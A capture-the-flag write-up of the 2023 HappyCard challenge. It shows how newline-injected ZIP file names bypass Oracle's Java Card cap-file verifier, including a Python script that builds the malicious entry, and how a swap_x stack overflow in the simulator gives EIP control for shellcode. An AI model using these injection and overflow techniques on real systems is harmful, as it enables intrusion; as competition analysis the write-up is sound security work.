## [RWCTF 2023] HappyCard

Writeup by [@nneonneo](https://github.com/nneonneo).

HappyCard was a pwn challenge in Real World CTF 2023. With a score of 425 and a total of four solves during the competition, it was a relatively difficult challenge. We solved the challenge with what is likely an unintended solution.

We're provided with a server to pwn, as well as a Docker image containing the code running on the server. Connecting to the server prompts us to upload a tarball containing files to be placed into `/upload`, after which the Docker image will be launched.

The provided Dockerfile installs [Wine](https://www.winehq.org/), then unpacks `java_card_simulator-3_1_0-u5-win-bin-do-b_70-09_mar_2021.msi` and `java_card_tools-win-bin-b_17-06_jul_2021.zip` into the Wine system (both provided with the image). These are Java Card SDK components directly from the Oracle website. The Docker image also comes with two additional files, `entrypoint.sh` and `hello.cap`. `entrypoint.sh` looks like this:

```sh
JC_HOME_TOOLS=/java_card_tools/
JC_HOME_SIM=/wine/drive_c/Program\ Files/Oracle/Java\ Card\ Development\ Kit\ Simulator\ 3.1.0/

SIM_CP=$JC_HOME_TOOLS/lib/asm-8.0.1.jar:$JC_HOME_TOOLS/lib/commons-cli-1.4.jar:$JC_HOME_TOOLS/lib/commons-logging-1.2-9f99a00.jar:$JC_HOME_TOOLS/lib/json.jar:$JC_HOME_TOOLS/lib/tools.jar:$JC_HOME_SIM/lib/jctasks_simulator.jar:$JC_HOME_SIM/lib/tools_simulator.jar:$JC_HOME_SIM/lib/api_classic.jar:$JC_HOME_SIM/lib/api_classic_annotations.jar
TOOLS_CP=$JC_HOME_TOOLS/lib/asm-8.0.1.jar:$JC_HOME_TOOLS/lib/commons-cli-1.4.jar:$JC_HOME_TOOLS/lib/commons-logging-1.2-9f99a00.jar:$JC_HOME_TOOLS/lib/jctasks_tools.jar:$JC_HOME_TOOLS/lib/json.jar:$JC_HOME_TOOLS/lib/tools.jar:$JC_HOME_TOOLS/lib/api_classic-3.1.0.jar:$JC_HOME_TOOLS/lib/api_classic_annotations-3.1.0.jar

verifycap() {
	java -Djc.home="$JC_HOME_TOOLS" -classpath "$TOOLS_CP" com.sun.javacard.offcardverifier.Verifier -nobanner $@
}

scriptgen() {
	java -Djc.home="$JC_HOME_SIM" -classpath "$SIM_CP" com.sun.javacard.scriptgen.Main -nobanner $@
}

script=/tmp/script

verifycap -outfile /tmp/hello.cap.digest /files/hello.cap
scriptgen -hashfile /tmp/hello.cap.digest -o /tmp/hello.cap.script /files/hello.cap
cat << EOF > $script
powerup;
output off;
0x00 0xA4 0x04 0x00 0x09 0xA0 0x00 0x00 0x00 0x62 0x03 0x01 0x08 0x01 0x7F;
EOF
FLAG=`echo -n "$FLAG"|perl -lne 'print map {"0x".(unpack "H*",$_)." "} split //, $_;'`
cat /tmp/hello.cap.script >> $script
cat << EOF >> $script
0x80 0xB8 0x00 0x00 0x08 0x06 0xAA 0xBB 0xCC 0xDD 0xEE 0xAA 0x00 0x7F;
0x00 0xA4 0x04 0x00 0x06 0xAA 0xBB 0xCC 0xDD 0xEE 0xAA 0x7F;
0x88 0x88 0x00 0x00 0x30 $FLAG 0x7f;
0x00 0xA4 0x04 0x00 0x09 0xA0 0x00 0x00 0x00 0x62 0x03 0x01 0x08 0x01 0x7F;
EOF

TMPDIR=/jctmp
mkdir $TMPDIR
cd /upload
for capfile in *.cap; do
    [ -f "$capfile" ] || continue
	verifycap -outfile "$TMPDIR/$capfile.digest" /upload/*.exp "$capfile" || { echo "verify failed"; exit; }
	scriptgen -hashfile "$TMPDIR/$capfile.digest" -o "$TMPDIR/$capfile.script" "$capfile" || { echo "scriptgen failed"; exit; }
	cat "$TMPDIR/$capfile.script" >> /tmp/script
done
echo "All verification finished"

cat << EOF >> $script
0x80 0xB8 0x00 0x00 0x08 0x06 0xAA 0xBB 0xCC 0xDD 0xEE 0xFF 0x00 0x7F;
0x00 0xA4 0x04 0x00 0x06 0xAA 0xBB 0xCC 0xDD 0xEE 0xFF 0x7F;
output on;
0x88 0x66 0x00 0x00 0x00 0x7f;
EOF

wine 'C:\Program Files\Oracle\Java Card Development Kit Simulator 3.1.0\bin\cref_t1.exe' -nobanner -nomeminfo &
sleep 5
java -Djc.home="$JC_HOME_SIM" -classpath "$SIM_CP" com.sun.javacard.apdutool.Main -nobanner -noatr $script
```

`hello.cap` is a 5KB file in ZIP format; unpacking it produces several files including two Java `.class` files, which can be trivially decompiled:

`safe.java`:

```
package com.rw.hello;

import javacard.framework.APDU;
import javacard.framework.Applet;
import javacard.framework.ISOException;
import javacard.framework.JCSystem;
import javacard.framework.Util;

public class safe extends Applet {
    private boolean isInit = false;
    private byte[] secret = new byte[48];

    public static void install(byte[] bArray, short bOffset, byte bLength) {
        new safe();
    }

    protected safe() {
        register();
    }

    public void process(APDU apdu) {
        byte[] buffer = apdu.getBuffer();
        if (buffer[0] != 0x00 || buffer[1] != (byte)0xA4) {
            if (buffer[0] == (byte)0x88 && buffer[1] == (byte)0x88) {
                if (buffer[4] != 48) {
                    ISOException.throwIt(26368); // SW_WRONG_LENGTH
                }
                if (this.isInit) {
                    ISOException.throwIt(27014); // SW_COMMAND_NOT_ALLOWED
                }
                JCSystem.beginTransaction();
                Util.arrayCopy(buffer, 5, this.secret, 0, 48);
                this.isInit = true;
                JCSystem.commitTransaction();
            } else if (buffer[0] == (byte)0x88 && buffer[1] == 0x66) {
                if (buffer[4] != 48) {
                    ISOException.throwIt(26368); // SW_WRONG_LENGTH
                }
                if (!this.isInit) {
                    ISOException.throwIt(27014); // SW_COMMAND_NOT_ALLOWED
                }
                JCSystem.beginTransaction();
                Util.arrayCopy(buffer, 5, this.secret, 0, 48);
                JCSystem.commitTransaction();
            }
        }
    }
}
```

`safeStrings.java`:

```
package com.rw.hello;

final class safeStrings {
    static final byte[] AppletName = {115, 97, 102, 101}; // "safe"
    static final byte[] Package = {99, 111, 109, 46, 114, 119, 46, 104, 101, 108, 108, 111}; // "com.rw.hello"

    safeStrings() {
    }
}
```

In addition, there's a `META-INF/MANIFEST.MF`:

```
Manifest-Version: 1.0
Runtime-Descriptor-Version: 3.0
Classic-Package-AID: //aid/AABBCCDDEE/00
Sealed: true
Application-Type: classic-applet
Created-By: 1.8.0_282 (AdoptOpenJDK)

Name: com/rw/hello
Java-Card-CAP-File-Version: 2.1
Java-Card-Package-AID: 0xaa:0xbb:0xcc:0xdd:0xee:0x00
Java-Card-Integer-Support-Required: FALSE
Java-Card-CAP-Creation-Time: Wed Dec 28 20:00:16 CST 2022
Java-Card-Imported-Package-2-AID: 0xa0:0x00:0x00:0x00:0x62:0x00:0x01
Java-Card-Converter-Provider: Oracle Corporation
Java-Card-Imported-Package-2-Version: 1.0
Java-Card-Applet-1-AID: 0xaa:0xbb:0xcc:0xdd:0xee:0xaa
Java-Card-Imported-Package-1-Version: 1.6
Java-Card-Package-Version: 1.0
Java-Card-Converter-Version:  [v3.0.5]
Java-Card-Applet-1-Name: safe
Java-Card-Package-Name: com.rw.hello
Java-Card-Imported-Package-1-AID: 0xa0:0x00:0x00:0x00:0x62:0x01:0x01

```

### Introduction

This challenge involves Java Card. Java Card is a technology which allows a restricted subset of Java to run on smartcard devices. Developers can load Java *applets* onto a Java Card smartcard, which can then provide functionality such as secure data storage or cryptographic services. For example, the `safe` Applet provided with the challenge implements a secret storage service which copies the flag into persistent memory, isolated from any other Applets.

A host device (card reader) communicates with a Java Card smartcard using ISO 7816-4 messages, called APDUs. The host will write a single APDU request packet to the card, which will respond with an APDU response packet. There are several different kinds of packets, but for our purposes we're interested in just two kinds:

- System commands, which are received by the Java Card runtime on the card. These are distinguished by a first byte less than 0x80; the only command we care about here is the SELECT command (`0x00 0xA4`) which selects an Applet to make active.
- Vendor commands, which have a first byte >= 0x80. These are received by the active Applet, and perform functions specific to that Applet.

Java Card devices have one predefined Applet, called Installer, which is responsible for downloading and installing additional Applets. Applets are identified by their AID, which is a sequence of 5-16 bytes; for example, the Installer's AID is `0xA0 0x00 0x00 0x00 0x62 0x03 0x01 0x08 0x01`.

The Java Card SDK comes with a simulator which accepts commands and runs Applets just like a real Java Card device. To interact with it, the user feeds a script file containing a list of APDUs into the `apdutool` utility; this utility feeds each APDU into the Java Card (either simulated or real) and retrieves the responses. To install an applet into the card, the user first selects the Installer applet using the APDU `0x00 0xA4 0x04 0x00 0x09 0xA0 0x00 0x00 0x00 0x62 0x03 0x01 0x08 0x01 0x7F`, then uses the `scriptgen` tool to produce a sequence of Installer APDUs to load the various pieces of a .cap file onto the device, and finally uses the Installer APDU `0x80 0xB8 0x00 0x00 0x08 <APPLET AID>` to install an Applet contained within that cap file.

Java Card implements a "firewall" between Applets: Applets cannot access objects created by other Applets except through explicit sharing interfaces. This is a key security mechanism which protects Applets even from other Applets running on the same card.

`.cap` files must be verified before they are installed, in order to ensure that they are correctly formed and that the Java bytecode contained within them is valid. The verification can be performed off-card (on the host machine) by `verifycap`, and/or by on-card logic in the Installer. Failure to verify a cap file fully can lead to exploits: a malformed cap file might be able to exploit broken bytecode to escape the Java runtime's restrictions and break the firewall.

### The challenge

The main purpose of the `entrypoint.sh` is to build a script and run it against the simulator. The generated script starts by installing the `safe` Applet from `hello.cap` (AID `0xAA 0xBB 0xCC 0xDD 0xEE 0xAA`), then selects that applet and provides the applet-specific APDU `0x88 0x88 0x00 0x00 0x30 $FLAG 0x7f`. This triggers the `process` method in `safe` to store the flag into the `buffer` variable, which will be stored to non-volatile memory on the card.

It then switches back to the Installer and installs additional (attacker-provided) .cap files from `/upload`. It installs a single attacker-provided Applet (AID `0xAA 0xBB 0xCC 0xDD 0xEE 0xFF`), selects it, and provides the APDU `0x88 0x66 0x00 0x00 0x00 0x7f`.

Due to the firewall, we cannot access anything within the `safe` Applet from our own Applet. Therefore, we will have to break the Java Card runtime somehow. However, all of the `.cap` files we submit to the server will be passed through `verifycap`, which performs fairly careful checks. There is a known exploit which can smuggle a type confusion bug past the verifier, called [PhiAttack](https://cardis2021.its.uni-luebeck.de/papers/CARDIS2021_Dubreuil.pdf) which apparently works on this challenge; however, we mistakenly dismissed this attack during the CTF as being inapplicable.

Instead, we found a different (and likely unintentional) way to bypass the verifier, by exploiting the `scriptgen` utility. The `scriptgen` utility takes an (already-verified) `.cap` file and produces a list of APDUs for the Installer. The generated script looks like this:

```
// com/pwning/library/javacard/Header.cap
0x80 0xB2 0x01 0x00 0x00 0x7F;
0x80 0xB4 0x01 0x00 0x13 0x01 0x00 0x10 0xDE 0xCA 0xFF 0xED 0x01 0x02 0x00 0x01 0x00 0x06 0xAA 0xBB 0xCC 0xDD 0xEE 0x03 0x7F;
0x80 0xBC 0x01 0x00 0x00 0x7F;

// com/pwning/library/javacard/Directory.cap
0x80 0xB2 0x02 0x00 0x00 0x7F;
0x80 0xB4 0x02 0x00 0x20 0x02 0x00 0x1F 0x00 0x10 0x00 0x1F 0x00 0x00 0x00 0x0B 0x00 0x02 0x00 0x01 0x00 0x01 0x00 0x0A 0x00 0x04 0x00 0x00 0x00 0x0C 0x00 0x00 0x00 0x00 0x00 0x00 0x01 0x7F;
0x80 0xB4 0x02 0x00 0x02 0x00 0x00 0x7F;
0x80 0xBC 0x02 0x00 0x00 0x7F;

// com/pwning/library/javacard/Import.cap
0x80 0xB2 0x04 0x00 0x00 0x7F;
0x80 0xB4 0x04 0x00 0x0E 0x04 0x00 0x0B 0x01 0x00 0x01 0x07 0xA0 0x00 0x00 0x00 0x62 0x00 0x01 0x7F;
0x80 0xBC 0x04 0x00 0x00 0x7F;
```

The filenames in the comments are filenames from the `.cap` ZIP file - Java Card does not consume `.class` files directly, but instead consumes a special Java Card-specific binary format consisting of several files with fixed names and formats (`Header.cap`, `Directory.cap`, etc.). We realized during the CTF that `scriptgen` will happily accept filenames with embedded newlines, which allows us to escape the `//` comment context and inject the filename contents directly into the script file. For example, if the file is called `com/pwning\n0x80 0xBA 0x00 0x00 0x00 0x7F;\n/Header.cap`, then the resulting script file would read

```
// com/pwning
0x80 0xBA 0x00 0x00 0x00 0x7F;
/Header.cap
0x80 0xB2 0x01 0x00 0x00 0x7F;
0x80 0xB4 0x01 0x00 0x13 0x01 0x00 0x10 0xDE 0xCA 0xFF 0xED 0x01 0x02 0x00 0x01 0x00 0x06 0xAA 0xBB 0xCC 0xDD 0xEE 0x03 0x7F;
0x80 0xBC 0x01 0x00 0x00 0x7F;
```

`verifycap` writes a digest file containing the SHA256 sums of all the `.cap` files that it has verified, and `scriptgen` checks these digests when emitting the script. However, the syntax of the digest file will be mangled if the filenames contain newlines, causing `scriptgen` to fail to find the hashes and report an error. We can work around the problem by using a fake `Export.cap` file instead: this file is optional, and its presence is indicated by a particular bit in the header that is not set by default. This causes `verifycap` to ignore the `Export.cap` file completely. `scriptgen`, however, will process the file *and* ignore the fact that the hash isn't present, as a special case.

Furthermore, as the filenames are actually stored only in the zip file and never extracted, we can make the filenames arbitrarily long and thus inject as many script commands as we want. Illegal syntax (e.g. `/Header.cap` on its own line) is ok, because `apdutool` parses incrementally and will therefore only flag a parse error after it has already parsed and transmitted all preceding APDUs.

The following [Python script](newline-hack.py) adds a malicious Export.cap to an otherwise-valid cap file (`library.cap`, containing a single empty class):

```python
import shutil
import zipfile

shutil.copy("library.cap", "upload/exploit.cap")
commands = [
    # finish uploading the original cap file
    # ConstantPool.cap
    "0x80 0xB2 0x05 0x00 0x00 0x7F;",
    "0x80 0xB4 0x05 0x00 0x05 0x05 0x00 0x02 0x00 0x00 0x7F;",
    "0x80 0xBC 0x05 0x00 0x00 0x7F;",
    # RefLocation.cap
    "0x80 0xB2 0x09 0x00 0x00 0x7F;",
    "0x80 0xB4 0x09 0x00 0x07 0x09 0x00 0x04 0x00 0x00 0x00 0x00 0x7F;",
    "0x80 0xBC 0x09 0x00 0x00 0x7F;",
    # finalize upload of original cap file
    "0x80 0xBA 0x00 0x00 0x00 0x7F;",
]
# add malicious (unverified) cap file(s) and any additional commands
commands += [row.strip() for row in open("hack.script") if row.strip() and not row.startswith("//")]

# convert commands to a file path
filename = "com/[*]\noutput on;"
for command in commands:
    command = " ".join(str(int(c, 0)) for c in command.rstrip(";").split())
    filename += "/* */" + command + ";"
filename += "/export.cap"

zf = zipfile.ZipFile("upload/exploit.cap", "a")
zf.writestr(filename, b"dummy")
```


So, in summary, we can bypass the off-card verifier by exploiting `scriptgen` to directly inject our own Installer APDUs into the script stream.

### Exploiting the simulator

The Java Card simulator has a [large number of documented vulnerabilities](https://security-explorations.com/javacard_vendors.html), most of which apparently aren't considered serious as the simulator is not intended for production use. Almost all of these bugs are mitigated by using the off-card verifier, which we've now bypassed.

This paper (https://security-explorations.com/materials/SE-2019-01-ORACLE.pdf) and the accompanying code package (https://packetstormsecurity.com/files/download/153293/se-2019-01-codes.zip) describe several such vulnerabilities with accompanying proof-of-concept exploit code. One of these, the `swap_x` bug (issue #17) is particularly interesting: it describes a bug in handling invalid arguments to the `swap_x` opcode which can be used to crash the simulator itself! Here's the buggy handler `__swap_x` in `cref_t1.exe`:

```c
int _swap_x()
{
  int v0; // ebx
  int result; // eax
  __int16 v2[4]; // [esp+14h] [ebp-14h] BYREF
  char v3; // [esp+1Ch] [ebp-Ch]
  char v4; // [esp+1Dh] [ebp-Bh]
  char Byte; // [esp+1Eh] [ebp-Ah]
  unsigned __int8 i; // [esp+1Fh] [ebp-9h]

  memset(v2, 0, 4u);
  Byte = fetchByte();
  v4 = Byte >> 4;
  v3 = Byte & 0xF;
  for ( i = 0; i < v3 + v4; ++i )
  {
    v0 = i;
    v2[v0] = popShort();
  }
  for ( i = 0; i < v4; ++i )
    pushShort(v2[v4 - i - 1]);
  for ( i = 0; ; ++i )
  {
    result = v3;
    if ( i >= v3 )
      break;
    pushShort(v2[v3 + v4 - i - 1]);
  }
  return result;
}
```

`v2` is an array with only four slots, but `v3` and `v4` may be up to 0xf in size. Thus, the `v3 + v4` loop can pop 14 elements onto a 4-element array, overflowing the entire stack including the saved ebx, ebp and eip values. Normally, the verifier will take care of ensuring that `swap_x` opcodes are only called with valid arguments (1 or 2).

Indeed, if we just take the proof-of-concept `test.script` and send it to the simulator, we get a Wine crash!

```
wine: Unhandled page fault on read access to 33445566 at address 33445566 (thread 0024), starting debugger...
Unhandled exception: page fault on read access to 0x33445566 in 32-bit code (0x33445566).
Register dump:
 CS:0023 SS:002b DS:002b ES:002b FS:006b GS:0063
 EIP:33445566 ESP:006dfdf0 EBP:778899aa EFLAGS:00010206(  R- --  I   - -P- )
 EAX:0000000d EBX:bbccbbcc ECX:00001a00 EDX:0000000d
 ESI:00000000 EDI:00000000
Stack dump:
0x006dfdf0:  000434f9 000434f9 00000001 00010000
0x006dfe00:  00000000 00000000 006dfe00 00426005
0x006dfe10:  00005c48 00824000 0000645c ffffffff
0x006dfe20:  00025800 3fffe000 006dfe58 00417e34
0x006dfe30:  00006da6 00000005 00000000 00000000
0x006dfe40:  0000000f 00000000 006dfe98 00000000
Backtrace:
=>0 0x33445566 (0x778899aa)
0x33445566: -- no code accessible --
Modules:
Module    Address            Debug info    Name (11 modules)
PE      400000-  4d2000    Deferred        cref_t1
PE    61740000-61832000    Deferred        advapi32
PE    69180000-691a6000    Deferred        wsock32
PE    6a280000-6a4cd000    Deferred        msvcrt
PE    6bc00000-6bc99000    Deferred        sechost
PE    70b40000-70df9000    Deferred        ucrtbase
PE    7b000000-7b348000    Deferred        kernelbase
PE    7b600000-7b929000    Deferred        kernel32
PE    7bc00000-7bea9000    Deferred        ntdll
PE    7fdd0000-7fdd6000    Deferred        ws2_32
PE    7fe00000-7fe04000    Deferred        iphlpapi
Threads:
process  tid      prio (all id:s are in hex)
00000020 (D) C:\Program Files\Oracle\Java Card Development Kit Simulator 3.1.0\bin\cref_t1.exe
    00000024    0 <==
    000000f0    0
```

Even more usefully, the proof-of-concept provides control over EIP and EBP (here set to 0x33445566 and 0x778899aa). Furthermore, the `cref_t1.exe` simulator binary is compiled without PIE, and by looking at the process's `/proc/PID/maps`, we can see that large parts of the memory space, including BSS, is mapped RWX!

Exploiting this Wine binary turns out to be remarkably easy. Since we have an RWX BSS, and the binary stores the entire simulated Java Card memory space in the BSS, we can just have our Java code allocate a big array (which will go into the simulated EEPROM in BSS), fill the array with shellcode, and then jump there with our EIP control (no PIE!). Because of the design of Wine, we can just use standard Linux shellcode.

We made the necessary modifications to the proof-of-concept code (adding the shellcode allocation in Java, padded to a large size with NOPs, and setting EIP to 0x004c2000 - where the shellcode gets allocated to), then built a new script ([`swap_x.script`](swap_x.script)) and applied the newline exploit to create a cap file ([`exploit.cap`](exploit.cap)). For a command, we simply ran `cat /tmp/script` to dump out the flag encoded in the script.

This works, and pretty quickly yields up the flag: `rwctf{H4ppyCa3d70622991b972389a1f0575ed7d20488f}`
